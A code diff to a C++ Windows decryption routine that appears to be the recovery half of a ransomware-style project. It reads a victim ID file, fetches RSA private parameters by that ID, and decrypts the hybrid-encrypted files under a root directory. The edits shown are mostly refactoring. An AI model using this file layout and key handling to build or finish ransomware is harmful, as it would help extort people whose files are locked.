@@ -1,6 +1,5 @@
 #include "Decryption.h"
 
-
 std::string hex_to_string(const std::string& input);
 static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor);
@@ -108,18 +107,20 @@ DECCLEAN:
 	return status;
 }
 
-Status decrypt_wrapper(string path, RsaDecryptor rsaDecryptor)
+Status decrypt_wrapper(string path, RsaDecryptor& rsaDecryptor)
 {
 	std::ifstream ifile;
 	PBYTE keyIV = nullptr, keyIVBuff = nullptr, iv = nullptr, key = nullptr, cipher = nullptr;
 	Status status = STATUS_SUCCESS;
-	
-	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+
+	if (!do_decrypt(path)) return STATUS_UNSUCCESSFUL;
+	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ENCRYPTED_KEY_IV_LEN);
 	if (keyIV == nullptr)
 	{
 		status = STATUS_UNSUCCESSFUL;
 		goto CLEAN;
 	}
+
 	iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if (iv == nullptr)
 	{
@@ -132,7 +133,8 @@ Status decrypt_wrapper(string path, RsaDecryptor rsaDecryptor)
 		status = STATUS_UNSUCCESSFUL;
 		goto CLEAN;
 	}
-	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
+	size_t cipherSize = getFileSize(path) - ENCRYPTED_KEY_IV_LEN - IV_DIGITS_NUM;
+
 	cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 	if (cipher == nullptr) 
 	{
@@ -147,7 +149,7 @@ Status decrypt_wrapper(string path, RsaDecryptor rsaDecryptor)
 	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = {0};
 	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
 	BYTE paddingSize = strtol(paddingSizeTmpBuff,NULL,10);
-	ifile.read((char*)keyIV, IV_LEN+KEY_LEN);
+	ifile.read((char*)keyIV, ENCRYPTED_KEY_IV_LEN);
 	ifile.read((char*)cipher, cipherSize);
 	ifile.close();
 	//TODO add status read
@@ -197,7 +199,7 @@ std::string hex_to_string(const std::string& input)
 	return output;
 }
 
-static void iterate(const path& parent, RsaDecryptor rsaDecryptor) {
+static void iterate(const path& parent, RsaDecryptor& rsaDecryptor) {
 	string path;
 	directory_iterator end_itr;
 	Status status = STATUS_SUCCESS;
@@ -226,10 +228,11 @@ int decryption_main()
 	string path = ROOT_DIR;
 	string pathToID = get_path_to_id();
 	std::ifstream idFile;
+
 	RsaDecryptor rsaDecryptor;
 	StringPrivateBlob stringPrivateBlob;	
 	
-	idFile.open(pathToID, std::ios::binary);
+	idFile.open(pathToID, std::ios::binary);//TODO check it 
 	id = string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
 	idFile.close();
 	id.erase(0, 1);
@@ -240,9 +243,7 @@ int decryption_main()
 	{
 		return -1;
 	}
-
 	rsaDecryptor.init_Decryptor(stringPrivateBlob);
-
 	iterate(path, rsaDecryptor);
 
 	remove(pathToID);
